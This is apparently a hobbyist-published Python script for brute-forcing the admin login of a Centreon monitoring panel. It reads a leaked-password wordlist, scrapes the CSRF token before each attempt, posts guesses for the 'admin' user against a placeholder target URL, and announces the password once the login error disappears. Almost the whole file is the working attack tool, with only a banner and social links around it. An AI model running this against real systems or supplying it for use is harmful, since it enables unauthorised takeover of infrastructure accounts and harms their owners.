#!/usr/bin/env python3


from pwn import *
import requests, re, signal, sys, pdb, time


# THIS TOOLS IS FOR CENTREON PANEL LOGIN

# BY: try.to.by.a.hacker

def def_handler(sig, frame):
    print("\n\n[!] Saliendo...\n")
    sys.exit(1) 

#Ctrl+C
signal.signal(signal.SIGINT, def_handler)

# Variables globales

# Basic user interface header
print(r"""
   __                            __                  __                                 __                            __                                    ___    
  |  \                          |  \                |  \                               |  \                          |  \                                  /   \   
 _| $$_     ______   __    __  _| $$_    ______     | $$____   __    __     ______     | $$____    ______    _______ | $$   __   ______    ______         /  $$$__ 
|   $$ \   /      \ |  \  |  \|   $$ \  /      \    | $$    \ |  \  |  \   |      \    | $$    \  |      \  /       \| $$  /  \ /      \  /      \       |  $$ |  \
 \$$$$$$  |  $$$$$$\| $$  | $$ \$$$$$$ |  $$$$$$\   | $$$$$$$\| $$  | $$    \$$$$$$\   | $$$$$$$\  \$$$$$$\|  $$$$$$$| $$_/  $$|  $$$$$$\|  $$$$$$\      | $$   \$$
  | $$ __ | $$   \$$| $$  | $$  | $$ __| $$  | $$   | $$  | $$| $$  | $$   /      $$   | $$  | $$ /      $$| $$      | $$   $$ | $$    $$| $$   \$$      | $$   __ 
  | $$|  \| $$      | $$__/ $$ _| $$|  \ $$__/ $$ __| $$__/ $$| $$__/ $$ _|  $$$$$$$ __| $$  | $$|  $$$$$$$| $$_____ | $$$$$$\ | $$$$$$$$| $$             \$$\_|  \
   \$$  $$| $$       \$$    $$|  \$$  $$\$$    $$|  \ $$    $$ \$$    $$|  \$$    $$|  \ $$  | $$ \$$    $$ \$$     \| $$  \$$\ \$$     \| $$              \$$ \ $$
    \$$$$  \$$       _\$$$$$$$ \$$\$$$$  \$$$$$$  \$$\$$$$$$$  _\$$$$$$$ \$$\$$$$$$$ \$$\$$   \$$  \$$$$$$$  \$$$$$$$ \$$   \$$  \$$$$$$$ \$$               \$$$\$ 
                    |  \__| $$                                |  \__| $$                                                                                           
                     \$$    $$                                 \$$    $$                                                                                           
                      \$$$$$$                                   \$$$$$$                                                                                            
""")
print("\n****************************************************************")
print("\n* TRY.TO.BY.A.HACKER                                           *")
print("\n* https://github.com/trytobyahacker                            *")
print("\n* https://youtube.com/@trytobyahacker                          *")
print("\n* https://www.instagram.com/try.to.by.a.hacker                 *")
print("\n* https://www.tiktok.com/@try.to.by.a.hacker                   *\n\n")


login_url = "http://IP/centreon/index.php" # PUT YOUR TARGET HERE


def makeRequest():

    f = open("/usr/share/seclists/Passwords/darkweb2017-top10000.txt", "r") # HERE IN FOR THE WORDLIST, AND "r" IS TO GIVE PERMISSION TO READ DE WORDLIST

    s = requests.session()

    p1 = log.progress("Brute Force")
    p1.status("Start attack")

    time.sleep(2)

    counter = 0

    for password in f.readlines():

        password = password.strip()

        p1.status("Trying the password [%d/100000]: %s" % (counter, password))

        r = s.get(login_url)

        centreonToken = re.findall(r'centreon_token" type="hidden" value="(.*?)"', r.text)[0] 

        post_data = {
            'useralias': 'admin', # IN THIS CASE I KNOE DE USERNAME, IS admin, BUT IN YUR CASE YOU WILL NEED TO KNOW WHICH ONE IS THE USERNAME
            'password': '%s' % password,
            'submitLogin': 'Connect',
            'centreon_token': centreonToken
        }
        r = s.post(login_url, data=post_data)

        if "Your credentials are incorrect." not in r.text:
            p1.success("The password is: %s" % password)
            sys.exit(0) 

        counter += 1
    

if __name__ == '__main__':

    makeRequest() 
